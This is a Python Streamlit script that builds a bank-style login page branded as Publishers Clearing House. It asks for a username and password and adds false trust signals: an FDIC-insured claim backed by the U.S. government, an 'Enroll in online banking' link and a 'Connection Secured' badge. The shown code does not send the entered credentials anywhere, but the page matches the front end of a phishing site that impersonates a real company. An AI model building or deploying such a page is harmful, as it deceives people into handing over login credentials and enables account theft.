import streamlit as st
import base64

pch_logo_base64 = """
iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAYAAACtWK6eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAA
AGXRFWHRTb2Z0d2FyZQBwYWludC5uZXQgNC4xLjEz0c8HAAABH0lEQVR4nO3VwQkAMAjDQPz/Py
g5ZIQIO4OgTvTyhQjDM6KSi/gYMBiZ9iWc/vF3bA93tXDd9gLQAAAEAgIAAAAAAAgDw9DYp8Fb9
90+9MwvDAAAAAAAJw4QNm7tYqTfN2BfU4kAAAAAAAAAOAmxn2CP/QL5zAN8NgEAAAAAAAA4IZCZ
A+q87IE6e9z63zo5tfPpz6dbz+3fA0DQAAQKAh9Zz1faF2v6Hf93d8AAAAAAAAAAABQPAK2C/7
Z/3J3D4WZl+VPZ+W6u9/Y+qedQAAAN0o3r6PhvRAAAgK2y4f+TzUzH8zvw9Zl4XANQAAAKA+7c
PAAAAAAAABYLQEAAMDEAQAAAK1Azqv8A2zEYRTfkeFEAAAAASUVORK5CYII=
""".strip()

st.set_page_config(page_title="PCH Login", layout="centered")

st.markdown("""
<style>
    .main {
        background-color: #ffffff;
    }
    .logo-header {
        background-color: #003087;  /* deep blue bank color */
        padding: 0.5rem 0;
        border-radius: 0 0 8px 8px;
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .logo-header img {
        height: 60px;  /* smaller logo */
        width: auto;
    }
    .logo-text {
        color: white;
        font-weight: bold;
        font-family: Arial, sans-serif;
        font-size: 18px;
        margin-left: 15px;
        text-shadow: 2px 2px 4px #000000;
        user-select: none;
    }
    .fdic-box {
        background-color: #f5f5f5;
        padding: 1rem;
        margin: 1.5rem 0;
        border-radius: 8px;
        text-align: center;
        font-size: 14px;
    }
    .login-title {
        font-size: 20px;
        font-weight: bold;
        margin-bottom: 1rem;
        text-align: center;
    }
    .show-password {
        font-size: 12px;
        color: #003087;
        text-align: right;
        margin-top: -10px;
        margin-bottom: 10px;
    }
    .checkbox-label {
        font-size: 14px;
        margin-left: 8px;
    }
    .security-info {
        text-align: center;
        margin-top: 2rem;
        color: gray;
        font-size: 13px;
    }
    .login-button {
        background-color: #003087;
        color: white;
        border: none;
        padding: 0.75rem;
        width: 100%;
        font-size: 16px;
        border-radius: 4px;
        cursor: pointer;
    }
    .link-style {
        color: #003087;
        font-size: 13px;
        text-align: center;
    }
    a {
        text-decoration: none;
    }
</style>
""", unsafe_allow_html=True)

st.markdown(f'''
    <div class="logo-header">
        <img src="data:image/png;base64,{pch_logo_base64}" alt="PCH Logo" />
        <div class="logo-text">Publishers Clearing House</div>
    </div>
''', unsafe_allow_html=True)

st.markdown('<div class="fdic-box">FDIC-Insured - Backed by the full faith and credit of the U.S. Government.</div>', unsafe_allow_html=True)

st.markdown('<div class="login-title">Account Login</div>', unsafe_allow_html=True)

username = st.text_input("Username")
password = st.text_input("Password", type="password")

st.markdown('<div class="show-password">🔒 Show</div>', unsafe_allow_html=True)

remember = st.checkbox("Remember my username")

st.markdown('<button class="login-button">Log In</button>', unsafe_allow_html=True)

st.markdown("""
<div class="link-style">
    <a href="#">Forgot username or password?</a><br>
    <a href="#">Enroll in online banking</a>
</div>
""", unsafe_allow_html=True)

st.markdown('<div class="security-info">🔒 Connection Secured</div>', unsafe_allow_html=True)
